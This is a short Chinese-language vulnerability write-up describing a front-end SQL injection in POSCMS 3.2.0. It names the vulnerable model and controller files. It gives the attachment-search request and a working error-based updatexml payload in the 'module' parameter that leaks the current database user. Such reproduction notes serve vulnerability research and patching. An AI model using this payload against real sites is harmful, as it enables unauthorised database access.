POSCMS 3.2.0 前台sql注入漏洞
============================

一、漏洞简介
------------

二、漏洞影响
------------

POSCMS 3.2.0

三、复现过程
------------

![1.png](/Users/aresx/Documents/VulWiki/.resource/POSCMS3.2.0前台sql注入漏洞/media/rId24.png)

查看源码（`\diy\dayrui\models\Attachment_model.php`）可以发现注入点：

![2.png](/Users/aresx/Documents/VulWiki/.resource/POSCMS3.2.0前台sql注入漏洞/media/rId25.png)

该函数的调用点位于（`\diy\module\member\controllers\Account.php`）：

![3.png](/Users/aresx/Documents/VulWiki/.resource/POSCMS3.2.0前台sql注入漏洞/media/rId26.png)

对应的功能实际是前台用户中心---\>基本管理---\>附件管理的搜索功能，随便选择某个类别搜索后会看到这条请求：

    GET /index.php?s=member&c=account&m=attachment&module=photo&ext= HTTP/1.1
    Host: www.0-sec.org

向`module`参数注入Payload果然出现了报错：

![4.png](/Users/aresx/Documents/VulWiki/.resource/POSCMS3.2.0前台sql注入漏洞/media/rId27.png)

但不知道为什么博客里的Payload这里复现失败了，不过已经知道是报错注入，我用了经典的Payload------`" or updatexml(1,concat(1,0x7e,user()),1);#`拼接入参数中，得到了数据库当前用户：

    GET /index.php?s=member&c=account&m=attachment&module=photo%22%20or%20updatexml(1,concat(1,0x7e,user()),1);%23&ext= HTTP/1.1
    Host: www.0-sec.org

![5.png](/Users/aresx/Documents/VulWiki/.resource/POSCMS3.2.0前台sql注入漏洞/media/rId28.png)

参考链接
--------

> https://xz.aliyun.com/t/4858\#toc-5
